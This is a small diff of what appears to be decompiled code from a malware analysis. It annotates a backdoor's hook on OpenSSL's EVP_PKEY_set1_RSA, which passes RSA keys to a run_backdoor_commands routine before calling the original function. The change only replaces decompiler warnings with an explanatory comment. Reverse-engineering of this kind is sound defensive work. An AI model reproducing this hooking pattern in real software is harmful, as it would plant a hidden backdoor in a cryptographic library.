@@ -25,8 +25,7 @@ int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey,RSA *key)
     if (key != (RSA *)0x0) {
       run_backdoor_commands(key,global_ctx,&call_orig);
     }
-                    /* WARNING: Could not recover jumptable at 0x0010a323. Too many branches */
-                    /* WARNING: Treating indirect jump as call */
+                    /* Hook tail-call: after run_backdoor_commands() it jumps through orig_EVP_PKEY_set1_RSA, so the saved pointer call only looks like a jumptable. */
     iVar1 = (*orig_EVP_PKEY_set1_RSA)(pkey,key);
     return iVar1;
   }
